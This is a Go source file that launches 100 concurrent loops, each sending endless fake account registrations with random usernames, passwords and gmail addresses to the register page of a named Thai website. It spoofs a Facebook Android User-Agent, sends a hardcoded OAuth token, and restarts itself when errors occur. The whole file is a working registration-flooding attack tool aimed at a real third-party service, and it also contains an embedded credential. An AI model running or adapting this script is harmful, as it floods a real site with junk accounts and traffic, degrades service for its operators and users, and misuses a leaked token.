package main

import (
	"bytes"
	"fmt"
	//"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"math/rand"
	"time"
)

var letters = []rune("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

type Block struct {
	Try     func()
	Catch   func(Exception)
	Finally func()
}

type Exception interface{}

func Throw(up Exception) {
	panic(up)
}

func (tcf Block) Do() {
	if tcf.Finally != nil {
		defer tcf.Finally()
	}
	if tcf.Catch != nil {
		defer func() {
			if r := recover(); r != nil {
				tcf.Catch(r)
			}
		}()
	}
	tcf.Try()
}


func main() {
	//thread
	for i := 0; i < 100; i++ {
		go website()
	}
	fmt.Scanln()
}

func website() string {
	Block{
		Try: func() {
			for true {
				var web  = "https://voteshop.in.th/call/register.php"
				var username = randSeq(13)
				var password = randSeq(13)
				var email = randSeq(13) + "@gmail.com"
		
				client := &http.Client{}
				data := url.Values{}
				data.Add("username", username)
				data.Add("password", password)
				data.Add("cf_password", password)
				data.Add("email", email)		
				req, err := http.NewRequest("POST", fmt.Sprintf("%s/token", web), bytes.NewBufferString(data.Encode()))
				req.Header.Set("Authorization", "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32") 
				req.Header.Set("User-Agent", "[FBAN/FB4A;FBAV/37.0.0.0.109;FBBV/11557663;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Android;FBMF/unknown;FBBD/generic;FBPN/com.facebook.katana;FBDV/google_sdk;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]") 
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value") // This makes it work
				
				resp, err := client.Do(req)
				defer resp.Body.Close()
				if err != nil {
					log.Fatal(err)
				}
				//fmt.Println(string(f))
				dt := time.Now()
				fmt.Println(dt.Format("15:04:05") , "| USER : " + username + " PASS : " + password + " EMAIL : " + email)
			}
		},
		Catch: func(e Exception) {
		go website()
		fmt.Scanln()
		},
	}.Do()
	return "few"
}
